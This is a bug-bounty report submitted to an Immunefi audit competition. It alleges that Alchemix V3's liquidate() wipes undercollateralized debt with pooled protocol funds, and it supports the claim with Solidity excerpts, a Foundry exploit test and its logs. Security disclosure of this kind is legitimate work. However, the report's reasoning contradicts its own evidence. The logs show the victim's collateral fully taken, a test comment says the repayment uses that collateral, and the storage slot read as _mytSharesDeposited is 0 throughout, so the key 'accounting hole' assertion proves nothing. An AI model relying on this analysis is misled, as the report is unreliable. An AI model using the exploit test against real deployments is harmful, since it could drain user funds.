# 57751 sc high there is a problem related to forced liquidation branch and this creates issue thatk cna drains protocol backing&#x20;

**Submitted on Oct 28th 2025 at 17:08:40 UTC by @XDZIBECX for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57751
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

there is a problem here in this contract because in the contract is let that `liquidate()` can erase an undercollateralized user's entire debt and this is happen using the protocol funds instead of actually seizing that user's collateral. so When the `liquidate(accountId)` runs, it first calls `_forceRepay()` which reduces `account.debt` in storage and sends real MYT to the `transmuter` using the protocol’s own balance, the `TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);`, and this is happens before any collateral is actually liquidated from that user, Immediately after, the `liquidate()` checks `if (account.debt == 0)` and, if true, it stops there, and pays the caller a fee with protocol funds `TokenUtils.safeTransfer(myt, msg.sender, feeInYield);`), and is returns without calling `_doLiquidation()` which is the only place where collateral would actually be seized from the user. means the position’s debt is cleared and the liquidator is rewardeed, but the user’s remaining collateral was never fully taken to cover what they owed; instead, the protocol itself covered that bad debt. and if this still repeated, then the protocol can be drained and pushed toward insolvency. check the poc is show this issue

## Vulnerability Details

this issue is came from the “repay-only” of the `liquidate()` and comes from a mismatch between the internal bookkeeping and real asset movemen when the `liquidate(accountId)` is runs, it first calls the `_forceRepay(accountId, account.earmarked)`. Inside `_forceRepay()`, three key lines run in order are here ---> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L758C8-L782C6> :

```solidity
  _subDebt(accountId, credit); << here is clears user's debt in storage + reduces global totalDebt

        // Repay debt from earmarked amount of debt first
        uint256 earmarkToRemove = credit > account.earmarked ? account.earmarked : credit;
        account.earmarked -= earmarkToRemove;

        creditToYield = creditToYield > account.collateralBalance ? account.collateralBalance : creditToYield;
        account.collateralBalance -= creditToYield; << here is  just decrements an internal number on the account 

        uint256 protocolFeeTotal = creditToYield * protocolFee / BPS;

        emit ForceRepay(accountId, amount, creditToYield, protocolFeeTotal);

        if (account.collateralBalance > protocolFeeTotal) {
            account.collateralBalance -= protocolFeeTotal;
            // Transfer the protocol fee to the protocol fee receiver
            TokenUtils.safeTransfer(myt, protocolFeeReceiver, protocolFeeTotal); << 
        }

        if (creditToYield > 0) {
            // Transfer the repaid tokens from the account to the transmuter.
            TokenUtils.safeTransfer(myt, address(transmuter), creditToYield);  << here the problem is sends real MYT out of the protocol contract 
        }
        return creditToYield;
    }
```

There are two problems here so the first, \_subDebt(accountId, credit) is reduces the account.debt and also reduces the global totalDebt, even though the contract has not actually seized and isolated enough collateral from that borrower to cover the repayment. a,d second the account.collateralBalance -= creditToYield only updates a number in the storage. collateralBalance is just an accounting variable, not an actual per-account escrow; so all MYT collateral is pooled at the contract level. and afterr that, the TokenUtils.safeTransfer(myt, address(transmuter), creditToYield) is moves the real MYT out of the protocol contract and into the transmuter, and this is happen using protocol-held funds to pay down that user’s debt. and there isno guarantee that this MYT are actually came from that specific undercollateralized account as opposed to coming from other users’ collateral held in the shared pool. the \_forceRepay() also does not decrease the \_mytSharesDeposited, so after tokens are sent out, the protocol’s accounting still claims to have the same total collateral, even though the balance actually dropped on-chain.

* so after the `_forceRepay()`, the `_liquidate()` is checks ---> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L823C9-L828C10> :

```solidity
if (account.debt == 0) {
    feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield); 
    TokenUtils.safeTransfer(myt, msg.sender, feeInYield); << here where is  pays liquidator from pooled funds 
    return (repaidAmountInYield, feeInYield, 0);
}
```

At this point the account.debt can already be 0 because the \_forceRepay() is paid it off using shared the protocol MYT. When that if (account.debt == 0) branch is triggers, the liquidate() exits early and never calls \_doLiquidation(). and is Skipping \_doLiquidation() means the borrower’s remaining collateral is never actually seized to reimburse the protocol for what was just fronted on their behalf. Instead, the contyract is calls the \_resolveRepaymentFee() to compute a fee, and then pays that fee to the liquidator and this happen using another TokenUtils.safeTransfer(myt, msg.sender, feeInYield), again paying out of the shared protocol balance, not out of the defaulted account’s isolated collateral. \_resolveRepaymentFee() just does in-memory bookkeeping here --> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L902C8-L904C104> :

```solidity
fee = repaidAmountInYield * repaymentFee / BPS;
account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
```

so this line are only subtracts from the account.collateralBalance a number in storage, but does not ensure that the real MYT was actually reserved from that specific account before sending feeInYield to the liquidator. so as ressult an undercollateralized account’s bad debt is cleared and marked safe, and the liquidator gets paid, and the protocol itself is lose because the value was transferred out of the shared collateral pool without properly seizing that user’s remaining collateral. and repeating this is gone make drain the protocol-held MYT and drive the system toward to insolvency this need to be fixed

## Impact Details

i use this as an impact the protocol insolvency because the protocol can no longer cover its outstanding liabilities from his issue

this vulnerability lets an undercollateralized borrower to have their bad debt wiped and this using the protocol funds instead of their own collateral. becuase In \_forceRepay(), the contract transfers real MYT held by the protocol to the transmuter (TokenUtils.safeTransfer(myt, address(transmuter), creditToYield)), and reduces the borrower’s account.debt in storage.so after that, the liquidate() observes account.debt == 0, and exits early, and never calls the \_doLiquidation(), and this is means the borrower’s remaining collateral is not seized. and the contract then pays the liquidator a fee from the protocol funds (TokenUtils.safeTransfer(myt, msg.sender, feeInYield)). so as reuslt is the borrower’s debt is set to 0, and the borrower keeps the collateral that should have been liquidated, and the protocol itself spends real assets to cover that debt and reward the liquidator. and this is create unbacked liabilities and a protocol insolvency, because repeating this on multiple unsafe positions will drains the pooled MYT while those positions are recorded as fully repaid and healthy see test

## References

i use all in vulnerability details

## Proof of Concept

## Proof of Concept

here is a test show the issue : copy past this test in the AlchemistV3.t.sol and run it use the forge test --match-test testExploit\_FullRepayBranch\_AccountingMismatchAndLeak -vvvvv

```solidity



        function testExploit_FullRepayBranch_AccountingMismatchAndLeak() external {
        //
        // 1. Prep environment: whale seeds strategy, victim opens max-risk position
        //
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        // extra depositor keeps global collateralization "not terrible" so liquidation logic will still run.
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount * 2);
        alchemist.deposit(depositAmount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // victim deposits collateral and mints max debt
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);

        uint256 victimTokenId =
            AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

        // Borrow up to allowed amount (max LTV)
        uint256 mintAmount =
            alchemist.totalValue(victimTokenId) *
            FIXED_POINT_SCALAR /
            minimumCollateralization;

        alchemist.mint(victimTokenId, mintAmount, address(0xbeef));
        vm.stopPrank();

        //
        // 2. Start a redemption huge enough to earmark basically ALL of victim's debt over time
        // anotherExternalUser already has alToken (deal(...) in deployCoreContracts)
        //
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        //
        // 3. Fast-forward an entire transmutation window so earmarking matures.
        // This pushes almost ALL of victim's debt into `earmarked`, meaning `_forceRepay`
        // in liquidation will attempt to pay off basically 100% of the victim's debt.
        //
        vm.roll(block.number + 5_256_000);

        // Sanity snapshot before price nuke
        (
            uint256 collateralBeforePriceDrop,
            uint256 debtBeforePriceDrop,
            uint256 earmarkedBeforePriceDrop
        ) = alchemist.getCDP(victimTokenId);

        console.log("Before price drop:");
        console.log("  collateralBeforePriceDrop:", collateralBeforePriceDrop);
        console.log("  debtBeforePriceDrop     :", debtBeforePriceDrop);
        console.log("  earmarkedBeforePriceDrop:", earmarkedBeforePriceDrop);

        // REQUIRE: the earmarked debt is non-zero and significant
        require(earmarkedBeforePriceDrop > 0, "earmarking did not accrue");

        //
        // 4. Rug the MYT share price: increase yield token supply massively
        //    without increasing underlying backing.
        //    -> victim position becomes undercollateralized so liquidation is allowed.
        //
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();

        // reset then inflate supply by +50%
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 inflatedSupply = (initialVaultSupply * 5000 / 10_000) + initialVaultSupply;
        // 50% more shares => each share is worth less underlying
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(inflatedSupply);

        //
        // 5. Record system-wide accounting BEFORE liquidation.
        //
        uint256 alchemistMytBalanceBefore =
            IERC20(address(vault)).balanceOf(address(alchemist));

        // read private _mytSharesDeposited from storage slot 82
        // storage layout:
        //   slot0..50 Initializable
        //   slot51.. etc AlchemistV3 vars
        //   _mytSharesDeposited is at slot 82 (see layout analysis)
        uint256 mytSharesDepositedBefore = uint256(
            vm.load(address(alchemist), bytes32(uint256(82)))
        );

        uint256 tvlUnderlyingBefore = alchemist.getTotalUnderlyingValue(); // uses _mytSharesDeposited
        uint256 actualUnderlyingBefore = alchemist.convertYieldTokensToUnderlying(
            alchemistMytBalanceBefore
        );

        uint256 liquidatorBalBefore =
            IERC20(address(vault)).balanceOf(externalUser);

        // Also snapshot victim state before liquidation
        (
            uint256 victimCollateralBefore,
            uint256 victimDebtBefore,
            uint256 victimEarmarkedBefore
        ) = alchemist.getCDP(victimTokenId);

        console.log("Pre-liquidation snapshot:");
        console.log("  victimDebtBefore        :", victimDebtBefore);
        console.log("  victimEarmarkedBefore   :", victimEarmarkedBefore);
        console.log("  alchemistMytBalanceBefore:", alchemistMytBalanceBefore);
        console.log("  mytSharesDepositedBefore:", mytSharesDepositedBefore);
        console.log("  tvlUnderlyingBefore     :", tvlUnderlyingBefore);
        console.log("  actualUnderlyingBefore  :", actualUnderlyingBefore);

        //
        // 6. Liquidator (an arbitrary external address, not admin) calls liquidate.
        //    This will:
        //      - call _earmark()
        //      - call _sync()
        //      - see the account is unsafe
        //      - call _forceRepay(earmarked)
        //        which zeroes most/all of victim's debt using their collateral
        //      - because debt == 0 after _forceRepay, it will NOT go into _doLiquidation
        //        Instead it hits the "repayment-only" branch:
        //
        //          feeInYield = _resolveRepaymentFee(...)
        //          TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
        //
        //      - BUT it never decreases _mytSharesDeposited after sending out that MYT.
        //
        vm.startPrank(externalUser);
        (uint256 repaidAmountInYield,
         uint256 feeInYield,
         uint256 feeInUnderlying) = alchemist.liquidate(victimTokenId);
        vm.stopPrank();

        //
        // 7. Record AFTER liquidation.
        //
        uint256 alchemistMytBalanceAfter =
            IERC20(address(vault)).balanceOf(address(alchemist));

        uint256 mytSharesDepositedAfter = uint256(
            vm.load(address(alchemist), bytes32(uint256(82)))
        );

        uint256 tvlUnderlyingAfter = alchemist.getTotalUnderlyingValue(); // still uses _mytSharesDeposited
        uint256 actualUnderlyingAfter = alchemist.convertYieldTokensToUnderlying(
            alchemistMytBalanceAfter
        );

        uint256 liquidatorBalAfter =
            IERC20(address(vault)).balanceOf(externalUser);

        (
            uint256 victimCollateralAfter,
            uint256 victimDebtAfter,
            uint256 victimEarmarkedAfter
        ) = alchemist.getCDP(victimTokenId);

        console.log("Post-liquidation snapshot:");
        console.log("  victimDebtAfter         :", victimDebtAfter);
        console.log("  victimEarmarkedAfter    :", victimEarmarkedAfter);
        console.log("  victimCollateralAfter   :", victimCollateralAfter);
        console.log("  repaidAmountInYield     :", repaidAmountInYield);
        console.log("  feeInYieldPaidToCaller  :", feeInYield);
        console.log("  feeInUnderlying         :", feeInUnderlying);
        console.log("  alchemistMytBalanceAfter:", alchemistMytBalanceAfter);
        console.log("  mytSharesDepositedAfter :", mytSharesDepositedAfter);
        console.log("  tvlUnderlyingAfter      :", tvlUnderlyingAfter);
        console.log("  actualUnderlyingAfter   :", actualUnderlyingAfter);
        console.log("  liquidatorBalBefore     :", liquidatorBalBefore);
        console.log("  liquidatorBalAfter      :", liquidatorBalAfter);

        //
        // 8. ASSERTIONS THAT PROVE THE BUG
        //

        // A. The victim's debt is now zero. The account was "fixed" entirely using its collateral.
        //    This means we hit the repayment-only branch, NOT the normal liquidation path.
        assertApproxEqAbs(victimDebtAfter, 0, 1, "Victim should have no debt after liquidation repay branch");

        // B. The liquidator (arbitrary attacker address) got paid feeInYield.
        //    This payout is permissionless. It's taken directly out of the Alchemist's MYT balance.
        assertGt(feeInYield, 0, "Liquidator should receive >0 MYT as fee in repayment-only branch");
        assertEq(
            liquidatorBalAfter,
            liquidatorBalBefore + feeInYield,
            "Liquidator balance should increase by feeInYield"
        );

        // C. The Alchemist contract's MYT balance WENT DOWN by exactly (repaidAmountInYield + feeInYield),
        //    i.e. tokens actually left the system.
        //    This proves real assets left the protocol.
        assertApproxEqAbs(
            alchemistMytBalanceBefore - alchemistMytBalanceAfter,
            repaidAmountInYield + feeInYield,
            1e9,
            "Protocol MYT balance reduced by repayment + liquidator fee"
        );

        // D. BUT `_mytSharesDeposited` DID NOT CHANGE.
        //    This is the accounting hole: internal "deposited shares" still thinks the
        //    protocol holds those tokens, even though they were sent out!
        assertEq(
            mytSharesDepositedAfter,
            mytSharesDepositedBefore,
            "BUG: _mytSharesDeposited was NOT decremented after repayment-only liquidation"
        );

        // E. Because `getTotalUnderlyingValue()` relies on _mytSharesDeposited
        //    (not actual contract balance), the protocol still *reports*
        //    the same total TVL in underlying terms...
        assertEq(
            tvlUnderlyingAfter,
            tvlUnderlyingBefore,
            "BUG: Reported TVL did NOT go down"
        );

        // F. ...but in reality, the contract's actual MYT balance and actual underlying value WENT DOWN.
        //    This proves insolvency/over-reporting risk. The system now thinks it has
        //    more backing than it truly does.
        assertLt(
            actualUnderlyingAfter,
            actualUnderlyingBefore,
            "Actual underlying backing WENT DOWN"
        );

        // G. Sanity: feeInUnderlying should be zero in this branch because we didn't need fee vault.
        assertEq(
            feeInUnderlying,
            0,
            "Expected no external feeInUnderlying in repayment-only branch"
        );
    }

}

```

the logs

```solidity
$ forge test --match-test testExploit_FullRepayBranch_AccountingMismatchAndLeak -vvvvv
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testExploit_FullRepayBranch_AccountingMismatchAndLeak() (gas: 3097838)
Logs:
  Before price drop:
    collateralBeforePriceDrop: 200000000000000000000000
    debtBeforePriceDrop     : 180000000000000000018000
    earmarkedBeforePriceDrop: 180000000000000000018000
  Pre-liquidation snapshot:
    victimDebtBefore        : 180000000000000000018000
    victimEarmarkedBefore   : 180000000000000000018000
    alchemistMytBalanceBefore: 400000000000000000000000
    mytSharesDepositedBefore: 0
    tvlUnderlyingBefore     : 266666666666666666400000
    actualUnderlyingBefore  : 266666666666666666400000
  Post-liquidation snapshot:
    victimDebtAfter         : 0
    victimEarmarkedAfter    : 0
    victimCollateralAfter   : 0
    repaidAmountInYield     : 200000000000000000000000
    feeInYieldPaidToCaller  : 2000000000000000000000
    feeInUnderlying         : 0
    alchemistMytBalanceAfter: 198000000000000000000000
    mytSharesDepositedAfter : 0
    tvlUnderlyingAfter      : 266666666666666666400000
    actualUnderlyingAfter   : 131999999999999999868000
    liquidatorBalBefore     : 200000000000000000000000
    liquidatorBalAfter      : 202000000000000000000000

```
